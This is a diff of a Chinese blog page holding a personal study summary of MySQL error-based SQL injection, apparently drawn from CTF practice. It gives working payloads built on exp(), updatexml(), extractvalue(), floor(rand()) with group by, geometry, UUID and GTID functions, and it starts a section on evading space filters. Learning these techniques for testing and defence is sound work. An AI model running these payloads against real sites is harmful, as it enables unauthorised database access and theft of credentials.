@@ -6,12 +6,10 @@
     <meta charset="utf-8">
     <meta name="keywords" content="报错注入总结, 学习记录">
     <meta name="description" content="
-
 做过很多个 SQL 注入的题，于是我想总结自己的 SQL 注入知识点。
-
-
+&amp;gt;
 MySQL报错注入前言报错注入适用于页面无回显位置，但是仍然返回报错信息的情况。
-什么是报错注入？报错注入是指通过特殊函数错误使用并使其输出错误结果来获取信息。">
+什么是报错注入？报错注入是指通过特殊函数错误使用并使其输出错误结果来获取信">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -506,10 +504,8 @@ MySQL报错注入前言报错注入适用于页面无回显位置，但是仍然
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <!--toc-->
-
 <p>做过很多个 SQL 注入的题，于是我想总结自己的 SQL 注入知识点。</p>
-<blockquote>
-</blockquote>
+<p>&gt;</p>
 <h2 id="mysql"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>报错注入适用于页面无回显位置，但是仍然返回报错信息的情况。</p>
 <h4 id="什么是报错注入"><a href="#什么是报错注入？" class="headerlink" title="什么是报错注入？"></a>什么是报错注入？</h4><p>报错注入是指通过特殊函数错误使用并使其输出错误结果来获取信息。简单地说，就是在可以进行 sql 注入的位置，调用特殊的函数，利用函数报错使其输出错误结果来获取数据库的相关信息。（数据库的信息包含在错误结果中）</p>
 <h4 id="报错注入的前提"><a href="#报错注入的前提" class="headerlink" title="报错注入的前提"></a>报错注入的前提</h4><p>可以利用报错注入的前提条件是页面的错误信息会显示出来</p>
@@ -517,7 +513,7 @@ MySQL报错注入前言报错注入适用于页面无回显位置，但是仍然
 <ul>
 <li>BigInt 等数据类型溢出</li>
 <li>函数参数格式错误</li>
-<li>主键&#x2F;字段重复</li>
+<li>主键/字段重复</li>
 </ul>
 <h4 id="报错注入步骤"><a href="#报错注入步骤" class="headerlink" title="报错注入步骤"></a>报错注入步骤</h4><p>通过特殊函数的错误使用使其参数被页面输出。</p>
 <p>前提：服务器开启报错信息返回，也就是发生错误时返回报错信息。</p>
@@ -537,42 +533,38 @@ MySQL报错注入前言报错注入适用于页面无回显位置，但是仍然
 <h5 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h5><p>函数语法：<code>exp(int)</code></p>
 <p>适用版本：5.5.5~5.5.49</p>
 <p>该函数会返回 e 的 x 次方结果，如下图：</p>
-<p><img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20230120111216405.png" alt="image-20230120111216405"></p>
+<p><img src="/images/SQL注入总结/image-20230120111216405.png" alt="image-20230120111216405"></p>
 <p>使用该函数时什么时候会报错呢？我们知道，次方到后边每增加 1，其结果都将跨度极大，而 mysql 能记录的 double 数值范围有限，一旦结果超过范围，那么该函数就会报错。如下图：</p>
-<p><img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20230120111454374.png" alt="image-20230120111454374"></p>
+<p><img src="/images/SQL注入总结/image-20230120111454374.png" alt="image-20230120111454374"></p>
 <p>我们利用该函数进行报错注入的 payload 为：</p>
 <pre class="line-numbers language-none"><code class="language-none">exp(~(select * from(select user())a))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <p>其中，~ 符号为取反运算符。我们通常将字符串经过处理后变成大整数，再放到 exp 函数内，得到的结果就可以超过 mysql 的 double 数值范围，从而报错输出。<strong>至于为什么需要用两层子查询，这点我暂时还没有弄明白。</strong></p>
 <blockquote>
-<p>为何用子查询？一般在<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%AD%90%E6%9F%A5%E8%AF%A2&spm=1001.2101.3001.7020">子查询</a>中，程序先运行在嵌套在最内层的语句，再运行外层</p>
+<p>为何用子查询？一般在<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=子查询&amp;spm=1001.2101.3001.7020">子查询</a>中，程序先运行在嵌套在最内层的语句，再运行外层</p>
 <p>带入在这里就是先执行 select user() 生成一个别名为 a 的表然后再用 select 查询这个表 a ，然后 exp 函数报错，mysql 告诉我们报错信息从而带出用户名</p>
 </blockquote>
-<p><img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20230120112920673.png" alt="image-20230120112920673"></p>
+<p><img src="/images/SQL注入总结/image-20230120112920673.png" alt="image-20230120112920673"></p>
 <p>除了<code>exp()</code>之外，还有类似<code>pow()</code>之类的相似函数同样是可利用的，他们的原理相同。</p>
 <h5 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h5><p>函数语法：<code>updatexml(XML_document, XPath_string, new_value);</code></p>
 <p>适用版本：5.15+</p>
 <p>与 exp() 不同，updatexml 是由于参数的格式不正确而产生的错误，同样也会返回参数的信息</p>
 <p>payload:</p>
 <pre class="line-numbers language-none"><code class="language-none">updatexml(1,concat(0x7e,(select user()),0x7e),1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <p>我们在以上 payload 的前后添加 ~(0x7e) 使其不符合 xpath 格式从而报错。</p>
 <h5 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h5><p>函数语法：<code>EXTRACTVALUE (XML_document, XPath_string);</code></p>
 <p>适用版本：5.1.5+</p>
 <p>利用原理与 updatexml 函数相同</p>
 <p>payload：</p>
 <pre class="line-numbers language-none"><code class="language-none">and (extractvalue(1,concat(0x7e,(select user()),0x7e)))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <h5 id="randgroupcount"><a href="#rand-group-count" class="headerlink" title="rand()+group()+count()"></a>rand()+group()+count()</h5><blockquote>
-<p>关于以上三个函数组合形成报错注入的原理分析，强烈建议看这篇文章：<a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/Mysql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90(count()%E3%80%81rand()%E3%80%81group%20by).html">wooyun</a></p>
+<p>关于以上三个函数组合形成报错注入的原理分析，强烈建议看这篇文章：<a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/Mysql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90(count(">wooyun</a>%E3%80%81rand()%E3%80%81group%20by).html)</p>
 <p>关于相关函数函数介绍在这里：<a target="_blank" rel="noopener" href="https://www.yiibai.com/mysql/count.html">count</a></p>
 </blockquote>
-<p><img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20230120114119601.png" alt="image-20230120114119601"></p>
-<p><img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20230120114005165.png" alt="image-20230120114005165"></p>
-<p><img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20230120114056805.png" alt="image-20230120114056805"></p>
+<p><img src="/images/SQL注入总结/image-20230120114119601.png" alt="image-20230120114119601"></p>
+<p><img src="/images/SQL注入总结/image-20230120114005165.png" alt="image-20230120114005165"></p>
+<p><img src="/images/SQL注入总结/image-20230120114056805.png" alt="image-20230120114056805"></p>
 <p>payload 用法：</p>
 <pre class="line-numbers language-none"><code class="language-none">union select count(*),2,concat(&#39;:&#39;,(select database()),&#39;:&#39;,floor(rand()*2))as a from information_schema.tables group by a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <h4 id="几何函数报错注入"><a href="#几何函数报错注入" class="headerlink" title="几何函数报错注入"></a>几何函数报错注入</h4><ul>
 <li>GeometryCollection：<code>id=1 AND GeometryCollection((select * from (select* from(select user())a)b))</code></li>
 <li>polygon()：<code>id=1 AND polygon((select * from(select * from(select user())a)b))</code></li>
@@ -585,20 +577,17 @@ MySQL报错注入前言报错注入适用于页面无回显位置，但是仍然
 <p>参数格式不正确。</p>
 <pre class="line-numbers language-none"><code class="language-none">mysql&gt; SELECT UUID_TO_BIN((SELECT password FROM users WHERE id&#x3D;1));
 mysql&gt; SELECT BIN_TO_UUID((SELECT password FROM users WHERE id&#x3D;1));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
 <h4 id="gtid相关函数"><a href="#GTID相关函数" class="headerlink" title="GTID相关函数"></a>GTID相关函数</h4><p>参数格式不正确。</p>
 <pre class="line-numbers language-none"><code class="language-none">mysql&gt;select gtid_subset(user(),1);
 mysql&gt;select gtid_subset(hex(substr((select * from users limit 1,1),1,1)),1);
 mysql&gt;select gtid_subtract((select * from(select user())a),1);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
 <h4 id="join-using注列名"><a href="#join-using-注列名" class="headerlink" title="join using()注列名"></a>join using()注列名</h4><p>通过系统关键词join可建立两个表之间的内连接。</p>
 <p>通过对想要查询列名的表与其自身建议内连接，会由于冗余的原因(相同列名存在)，而发生错误。</p>
 <p>并且报错信息会存在重复的列名，可以使用 <strong>USING</strong> 表达式声明内连接（INNER JOIN）条件来避免报错。</p>
 <pre class="line-numbers language-none"><code class="language-none">mysql&gt;select * from(select * from users a join (select * from users)b)c;
 mysql&gt;select * from(select * from users a join (select * from users)b using(username))c;
 mysql&gt;select * from(select * from users a join (select * from users)b using(username,password))c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20230120125951654.png" alt="image-20230120125951654"></p>
+<p><img src="/images/SQL注入总结/image-20230120125951654.png" alt="image-20230120125951654"></p>
 <h2 id="绕过过滤"><a href="#绕过过滤" class="headerlink" title="绕过过滤"></a>绕过过滤</h2><h3 id="绕过空格过滤"><a href="#绕过空格过滤" class="headerlink" title="绕过空格过滤"></a>绕过空格过滤</h3><p>一般代替空格的字符串有</p>
 <ul>
 <li>%09</li>
@@ -1001,7 +990,7 @@ mysql&gt;select * from(select * from users a join (select * from users)b using(u
             contentSelector: '#articleContent',
             headingsOffset: -($(window).height() * 0.4 - 45),
             collapseDepth: Number('0'),
-            headingSelector: 'h2, h3, h4'
+            headingSelector: 'h2, h3, h4,h5'
         });
 
         // modify the toc link href to support Chinese.
@@ -1013,7 +1002,7 @@ mysql&gt;select * from(select * from users a join (select * from users)b using(u
 
         // modify the heading title id to support Chinese.
         i = 0;
-        $('#articleContent').children('h2, h3, h4').each(function () {
+        $('#articleContent').children('h2, h3, h4,h5').each(function () {
             $(this).attr('id', tocHeading + (++i));
         });
 
@@ -1142,7 +1131,7 @@ mysql&gt;select * from(select * from users a join (select * from users)b using(u
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">267.7k</span>
+                        class="white-color">259.5k</span>
             
             
             
